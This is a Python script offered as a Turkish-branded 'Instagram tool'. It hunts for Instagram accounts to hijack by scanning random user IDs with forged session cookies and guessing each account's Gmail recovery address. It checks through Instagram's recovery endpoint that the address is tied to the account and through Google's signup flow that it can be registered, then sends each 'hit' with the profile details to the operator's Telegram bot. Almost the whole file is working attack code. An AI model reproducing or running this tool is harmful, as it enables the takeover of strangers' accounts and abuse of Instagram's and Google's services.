print("YIKIM TOOL TEAM #AURA")
import os
import subprocess
import sys
from tqdm import tqdm
import time
from termcolor import colored

def install_package(package):
    try:
        __import__(package.lower().replace('-', '_'))
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])

try:
    import requests, names, random, mechanize, sys
    from user_agent import generate_user_agent
    from uuid import uuid4
    from pyfiglet import Figlet
    from colorama import Fore, Style, init
    import re
    from random import choice as cc, randint as rr
except Exception as e:
    packages = [
        "requests",
        "names",
        "mechanize",
        "user_agent",
        "uuid",
        "pyfiglet",
        "colorama",
        "instaloader",
        "pycryptodome",
        "rich"
    ]
    for _ in tqdm(packages, desc=colored("  Eksik pip'ler Yükleniyor", "green"), bar_format="{desc} {bar:20} {n_fmt}/{total_fmt}", leave=False, ncols=50):
        install_package(_)
        time.sleep(0.3) 
    print("\r" + " " * 50, end="")
    os.system("clear")
    os.system("clear")

import requests, os, names, random, time
from user_agent import generate_user_agent
from uuid import uuid4
import re
import sys
import json
from random import choice as cc, randint as rr
from uuid import uuid4 as gg
import instaloader
from random import choice, randrange
from threading import Thread
import os
import sys
import re
import requests
import time
from Crypto.Cipher import AES
import string
import hashlib
import os
import sys
import re
import requests
import time
import hashlib
from Crypto.Cipher import AES

yıkım_Z = '\033[1;31m'
yıkım_F = '\033[2;32m'
yıkım_X = '\033[1;33m'
yıkım_C = '\033[2;35m'
yıkım_M = '\033[1;36m'

def ekran_temizle():
    os.system('cls' if os.name == 'nt' else 'clear')
    
uid = uuid4()

ekran_temizle()
os.system("clear")
os.system('clear')

#------------------------------[renkler]------------------------------
Z = '\033[1;31m'  # Kırmızı
X = '\033[1;33m'  # Sarı
F = '\033[2;32m'  # Yeşil
C = "\033[1;97m"  # Beyaz
B = '\033[2;36m'  # Cam Göbeği
Y = '\033[1;34m'  # Açık Mavi
E = '\033[1;31m'
G = '\033[1;32m'
H = '\033[1;33m'

try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')

from rich import print as g
from rich.panel import Panel
import pyfiglet
from colorama import Fore, Style
os.system("clear")
ekran_temizle()
R = '\033[1;31;40m'
X = '\033[1;33;40m'
F = '\033[1;32;40m'
C = "\033[1;97;40m"
B = '\033[1;36;40m'
K = '\033[1;35;40m'
V = '\033[1;36;40m'
nnn = random.choice([R, X, F, B, K, V])
good_hot, bad_hot, good_ig, bad_ig, check, mj, ids = 0, 0, 0, 0, 0, 0, []

ekran_temizle()
os.system("clear")

import pyfiglet
from colorama import Fore, Style
from time import sleep

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

clear_screen()

GENISLIK = 56

print(Fore.BLUE + "┃" + "━" * GENISLIK + "┃")
yazi = pyfiglet.figlet_format("YIKIM-TOOL")
for satir in yazi.splitlines():
    if len(satir) > GENISLIK:
        satir = satir[:GENISLIK]
    print(Fore.BLUE + f"┃ {Fore.GREEN + Style.BRIGHT}{satir.center(GENISLIK - 2)} {Fore.BLUE}┃")

print(Fore.BLUE + f"┃{' ' * GENISLIK}┃")
print(Fore.BLUE + "┃" + "━" * GENISLIK + "┃")
print(Fore.BLUE + f"┃{'*' * GENISLIK}┃")
print(Fore.BLUE + f"┃{Fore.CYAN + '🔥 YIKIM INSTAGRAM TOOL V9.0 🔥'.center(GENISLIK)}{Fore.BLUE}┃")
print(Fore.BLUE + f"┃{Fore.MAGENTA + '           🚀 FAST \n          CR:https://t.me/YIKIMTOOL \n          SOLO DEVELOPERS:https://t.me/YIKIM44 \n'.center(GENISLIK)}{Fore.BLUE}┃")
print(Fore.BLUE + f"┃{'*' * GENISLIK}┃")
print(Fore.BLUE + "┃" + "━" * GENISLIK + "┃")
print(Fore.BLUE + f"┃{Fore.CYAN + Style.BRIGHT + '[+] TOKEN ve ID bilgilerini giriniz...'.center(GENISLIK)}{Fore.BLUE}┃\n")

token = input(Fore.BLUE + f"┃ [🔐] TOKEN:  {Fore.RESET}")
iD = input(Fore.BLUE + f"┃ [🆔] ID:  {Fore.RESET}")

clear_screen()
print(Fore.GREEN + "\n[✓] Başlatılıyor...\n")
sleep(0.6)

def telegrama_mesaj_gonder(hunt):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {
        'chat_id': iD,
        'text': hunt
    }
    requests.post(url, data=data)

def slow_print(text, delay=0.05):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

def insta_new(email, username, Id):
    yıkımtim_good_ig = 0
    yıkımtim_bad_ig = 0
    global good_ig, bad_ig
    try:
        app = ''.join(random.choice('1234567890') for i in range(15))
        rnd = str(random.randint(150, 999))
        ldg = "Instagram 311.0.0.32.118 Android (" + random.choice(["23/6.0","24/7.0","25/7.1.1","26/8.0","27/8.1","28/9.0"]) + "; " + str(random.randint(100,1300)) + "dpi; " + str(random.randint(200,2000)) + "x" + str(random.randint(200,2000)) + "; " + random.choice(["SAMSUNG","HUAWEI","LGE/lge","HTC","ASUS","ZTE","ONEPLUS","XIAOMI","OPPO","VIVO","SONY","REALME"]) + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111,999)) + ")"
        common_data = {'flow': 'fxcal', 'recaptcha_challenge_field': ''}
        data = {'email_or_username': email , **common_data}
        headers = {'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/login/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ldg,
            'x-asbd-id': '359341',
            'x-csrftoken': 'nGjJfH6QEiwNaHOPHIBXbYbzRkNkXGU9',
            'x-fb-friendly-name': 'QuickPromotionSupportIGSchemaBatchFetchQuery',
            'x-fb-lsd': 'AVqh1cE8VPU',
            'x-ig-app-id': '936619743392459',
        }
        
        response = requests.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/', headers=headers, data=data)
        time.sleep(1)
        
        if 'email_or_sms_sent' in response.text:
            good_ig += 1
            yıkımtim_good_ig += 1
            check_email_insta(email, username, Id)
        else:
            bad_ig += 1
            yıkımtim_bad_ig += 1
    except requests.exceptions.ConnectionError:
        insta_new(email, username, Id)
        
def new_insta1(email, username, Id):
    yıkımtr_good_ig = 0
    yıkımtr_bad_ig = 0
    global good_ig, bad_ig
    try:
        rnd = str(random.randint(150, 999))
        sdn = "Instagram 311.0.0.32.118 Android (" + random.choice(["23/6.0","24/7.0","25/7.1.1","26/8.0","27/8.1","28/9.0"]) + "; " + str(random.randint(100,1300)) + "dpi; " + str(random.randint(200,2000)) + "x" + str(random.randint(200,2000)) + "; " + random.choice(["SAMSUNG","HUAWEI","LGE/lge","HTC","ASUS","ZTE","ONEPLUS","XIAOMI","OPPO","VIVO","SONY","REALME"]) + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111,999)) + ")"
        url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
        head = {
            'Host': 'www.instagram.com',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/signup/email/',
            'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
            'user-agent': sdn
        }
        data = {'email': email }
        res = requests.post(url, headers=head, data=data)
        if 'email_is_taken' in res.text:
            good_ig += 1
            yıkımtr_good_ig += 1
            check_email_insta(email, username, Id)
        else:
            bad_ig += 1
            yıkımtr_bad_ig += 1
    except requests.exceptions.ConnectionError:
        new_insta1(email, username, Id)
        time.sleep(1)
        
def check_email_insta(email, username, Id):
    yıkımscan_good_hot = 0
    yıkımscan_bad_hot = 0
    global good_hot, bad_hot
    try:
        n1=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn') for _ in range(rr(6,9)))
        n2=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn') for _ in range(rr(3,9)))
        host=''.join(cc('azertyuiopmlkjhgfdsqwxcvbn') for _ in range(rr(15,30)))
        headers_init={"accept":"*/*","accept-language":"ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6","content-type":"application/x-www-form-urlencoded;charset=UTF-8","google-accounts-xsrf":"1","sec-ch-ua":"\"Not)A;Brand\";v=\"24\",\"Chromium\";v=\"116\"","sec-ch-ua-mobile":"?1","sec-ch-ua-platform":"\"Android\"","user-agent":str(gg())}
        ret=requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=headers_init)
        rok=re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', ret.text).group(2)
        cookies={'__Host-GAPS':host}
        headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp','user-agent':str(gg())}
        data={'f.req':'["'+rok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]','deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'}
        response = requests.post('https://accounts.google.com/_/signup/validatepersonaldetails', cookies=cookies, headers=headers, data=data)
        tl=str(response.text).split('",null,"')[1].split('"')[0]
        host=response.cookies.get_dict()['__Host-GAPS']
        cookies={'__Host-GAPS':host}
        headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,'user-agent':str(gg())}
        params={'TL':tl}
        data=('continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+username+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&')
        response = requests.post('https://accounts.google.com/_/signup/usernameavailability', params=params, cookies=cookies, headers=headers, data=data)
        if '"gf.uar",1' in response.text:
            good_hot += 1
            yıkımscan_good_hot += 1
            ınstagram_data(email, username, Id)
        elif '"gf.uar",2' in response.text or '"gf.uar",3' in response.text:
            bad_hot += 1
            yıkımscan_bad_hot += 1
    except requests.exceptions.ConnectionError:
        check_email_insta(email, username, Id)
        
def date_scan(Id):
    try:
        if Id is None:
            return "Bilinmeyen"
        Id = int(Id)
        ranges = [
            (17750001, 279760000, 2012),
            (279760001, 900990000, 2013),
            (900990001, 1629010000, 2014),
            (1629010001, 1900000000, 2015),
            (1900000001, 2500000000, 2016),
            (2500000001, 3713668786, 2017),
            (3713668787, 5699785217, 2018),
            (5699785218, 8507940634, 2019),
            (8507940635, 10500000000, 2020),
            (10500000001, 13500000000, 2021),
            (13500000001, 16000000000, 2022)
        ]
        for lower, upper, year in ranges:
            if lower <= Id <= upper:
                return year
        return "2019-2020-2021-2022"
    except ValueError:
        return "Geçersiz ID formatı"
    except Exception as e:
        print(f"date_sc hatası: {e}")
        return "Bilinmeyen"
                
def ınstagram_data(email, username, Id):
    try:
        csrf_token = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(32))
        datr = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(16))
        session_id = f"{Id}%3A{''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(10))}%3A28%3A{''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(24))}"
        cookies = {
            'datr': datr,
            'csrftoken': csrf_token,
            'ds_user_id': Id,
            'sessionid': session_id
        }
        headers = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/explore/search/',
            'user-agent': generate_user_agent(),
            'x-csrftoken': csrf_token,
            'x-ig-app-id': '1217981644879628',
        }
        data = {
            'variables': json.dumps({"id": Id, "render_surface": "PROFILE"}),
            'doc_id': '9383802848352200',
        }
        response = requests.post('https://www.instagram.com/graphql/query', cookies=cookies, headers=headers, data=data)
        user = response.json()["data"]["user"]
        username = user["username"]
        full_name = user.get("full_name", "Yok")
        biography = user.get("biography", "Yok")
        profile_pic = user.get("profile_pic_url", "")
        follower = user.get("follower_count", 0)
        following = user.get("following_count", 0)
        posts = user.get("media_count", 0)
        
        rest_headers = {
            'User-Agent': 'Instagram 100.0.0.17.129 Android',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie': 'csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        }
        rest_data = {
            'signed_body': f'XXX.{{"_csrftoken":"csrftoken","query":"{username}"}}',
            'ig_sig_key_version': '4',
        }
        reset = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=rest_headers, data=rest_data).json().get("email", "Bilinmiyor")
        hunt = f"""
✨🔥 𝓘𝓷𝓼𝓽𝓪 𝓗𝓲𝓽 𝓓ü𝓼𝓽ü 𝐁𝐫ø 🔥✨
━━━━━━━━━━━━━━━━━━━━━━
💥 𝐇𝐈𝐓 : True
🧑‍💻 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : @{username}
🆔 𝐍𝐀𝐌𝐄 : {full_name}
📬 𝐄𝐌𝐀𝐈𝐋 : {email}
🔄 𝐑𝐄𝐒𝐄𝐓 : {reset}
📅 INSTALLATİON : {date_scan(Id)}
🔗 𝐋𝐈𝐍𝐊 : https://www.instagram.com/{username}
🆔 𝐈𝐃 : {Id}
👥 𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒 : {follower}
➕ 𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆 : {following}
🖼️ 𝐏𝐎𝐒𝐓𝐒 : {posts}
✍️ 𝐁𝐈𝐎 : {biography}
📡 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 : @YIKIMTOOL
━━━━━━━━━━━━━━━━━━━━━━
🌐 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 𝐓𝐆 : @YIKIM44
"""
        print(hunt)
        telegrama_mesaj_gonder(hunt)
        time.sleep(10)
    except Exception as e:
        print()        

def check_email(email, username, Id):
    global good_hot, bad_hot, bad_ig, good_ig, check
    Choice = random.choice(['insta_new', 'new_insta1'])
    if Choice != 'new_insta':
        insta_new(email, username, Id)
    else:
        new_insta1(email, username, Id)
    check += 1
    random_color = random.choice([R, X, F, B, K, V])
    ekran_temizle()
    sys.stdout.write(
        f"\r{random_color} 🔥 [TARANAN]: {Fore.LIGHTYELLOW_EX} {check}{Style.RESET_ALL} | \n\n"
        f"{Fore.LIGHTGREEN_EX} ✅ [HIT]: {good_hot} |\n\n"
        f"{Fore.LIGHTRED_EX} ❌ [BAD IG]: {bad_ig} | \n\n"
        f"{Fore.LIGHTMAGENTA_EX} 📧 [BAD GM]: {bad_hot} | \n\n"
        f"{Fore.LIGHTCYAN_EX} 💎 [GOOD IG]: {good_ig} | "
    )
    sys.stdout.flush()

def rand_ids():
    Id = str(random.randrange(1, 35000000000))
    if Id not in ids:
        ids.append(Id)
        return Id
    else:
        return rand_ids()
        
def generate_and_check_accounts():
    kill = random.choice([
        'azertyuiopmlkjhgfdsqwxcvbn',
        'azertyuiopmlkjhgfdsqwxcvbn1234567890',
        'azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890'
    ])
    
    for _ in range(100):
        key = ''.join((random.choice(kill) for _ in range(random.randrange(3, 15))))
        Id = rand_ids()
        email = f"{key}@gmail.com"
        check_email(email, key, Id)
    
    for _ in range(100):
        key = ''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(32))
        Id = rand_ids()
        email = f"{key}@gmail.com"
        check_email(email, key, Id)
        
def merged_scan():
    while True:
        try:
            rnd = str(random.randint(150, 999))
            user_agent = "Instagram 311.0.0.32.118 Android (" + random.choice(["23/6.0","24/7.0","25/7.1.1","26/8.0","27/8.1","28/9.0"]) \
                         + "; " + str(random.randint(100,1300)) + "dpi; " + str(random.randint(200,2000)) + "x" + str(random.randint(200,2000)) \
                         + "; " + random.choice(["SAMSUNG","HUAWEI","LGE/lge","HTC","ASUS","ZTE","ONEPLUS","XIAOMI","OPPO","VIVO","SONY","REALME"]) \
                         + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111,999)) + ")"
            Id = rand_ids()
            lsd = ''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(32))
            keyword = ''.join(random.choice('123456780') for _ in range(10))
            kill = random.choice([
                'azertyuiopmlkjhgfdsqwxcvbn',
        'azertyuiopmlkjhgfdsqwxcvbn1234567890',
        'azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890'
            ])
            key = ''.join((random.choice(kill) for _ in range(random.randrange(3, 15))))
            rng = int("".join(random.choice("6789") for _ in range(1)))
            name = "".join(random.choice("1234567890qwertyuiopasdfghjklzxcvbnm.") for _ in range(rng))
            usery = random.choice([name, key])
            he3 = {
                'User-Agent': "com.zhiliaoapp.musically/2022509040 (Linux; U; Android 12; ar; TECNO BF6; Build/SP1A.210812.001; Cronet/TTNetVersion:ae513f3c 2022-08-08 QuicVersion:12a1d5c5 2022-06-27)",
            }
            
            response = requests.get('https://www.instagram.com/')
            csrf = response.cookies.get('csrftoken')
            
            headers = {
                'accept': '*/*',
                'accept-language': 'en,en-US;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'dnt': '1',
                'origin': 'https://www.instagram.com',
                'priority': 'u=1, i',
                'referer': 'https://www.instagram.com/cristiano/following/',
                'user-agent': user_agent,
                'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                'x-fb-lsd': lsd,
            }
            
            data = {
                'lsd': lsd,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                'variables': json.dumps({"userID": str(Id), "username": "cristiano"}),
                'server_timestamps': 'true',
                'doc_id': '7717269488336001',
            }
            
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            
            if response.status_code == 200:
                response_data = response.json()
                if response_data and "data" in response_data and response_data["data"] and "user" in response_data["data"]:
                    user = response_data["data"]["user"]
                    if user and user.get("follower_count", 0) >= 100:
                        username = user.get("username")
                        email = f"{username}@gmail.com"
                        check_email(email, username, Id)
                        continue
            raise Exception("kod 1 yöntemi başarısız. [!]")
        except Exception:
            try:
                merged_data = {
                    'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                    'variables': json.dumps({'id': random.randrange(2040000000, 2500000000), 'render_surface': 'PROFILE'}),
                    'doc_id': '25618261841150840'
                }
                merged_headers = {'X-FB-LSD': merged_data['lsd']}
                alt_response = requests.post('https://www.instagram.com/api/graphql', headers=merged_headers, data=merged_data)
                user_data = alt_response.json().get('data', {}).get('user', {})
                if user_data and user_data.get('follower_count', 0) >= 100:
                    username = user_data.get('username')
                    email = f"{username}@gmail.com"
                    yıkımdata = [username] = user_data
                    check_email(email, username, rand_ids())
            except Exception:
                continue
                
                generate_and_check_accounts()

for i in range(25):
    Thread(target=merged_scan).start()